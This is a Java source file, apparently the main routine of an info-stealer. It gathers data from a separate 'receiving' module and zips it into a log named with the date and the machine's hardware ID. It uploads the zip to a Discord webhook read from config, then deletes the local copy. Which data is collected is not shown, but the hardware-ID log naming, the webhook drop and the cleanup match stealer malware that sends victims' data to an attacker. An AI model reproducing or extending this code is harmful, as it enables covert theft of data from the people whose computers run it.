package maven.example.com.tools;

import maven.example.com.tools.archive.Archive;
import maven.example.com.tools.config.Config;
import maven.example.com.tools.config.ConfigReader;
import maven.example.com.tools.data.Data;
import maven.example.com.sending.tools.SendClient;
import maven.example.com.tools.rest.Hwid;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class Manager {
    public static void initialization(InputStream inputStream) {
        Config config = ConfigReader.readConfigFromFile(inputStream);
        List<Data> dataToSend = maven.example.com.receiving.Manager.receiving();
        SendClient client = maven.example.com.sending.Manager.getDiscordSendMessage(config.getProp().getProperty("discord.webhook.url"));
        String nameArchive = createLogName(new SimpleDateFormat("d-M-y--z"));
        File archive;

        try {
            archive = createArchive(dataToSend, nameArchive);
        } catch (Exception e) {
            System.err.println("Ошибка при создании архива");
            e.printStackTrace();
            client.close();
            return;
        }

        if (archive != null)
            client.send(archive);

        archive.delete();
        client.close();
    }

    private static String createLogName(DateFormat df) {
        return  "Log_" +
                df.format(new Date()) +
                "__" +
                Hwid.getHWID() +
                ".zip";
    }

    private static File createArchive(List<Data> dataToSend, String nameArchive) throws IOException {
        Archive archive = new Archive(dataToSend);
        return archive.filesToArchive(nameArchive);
    }
}
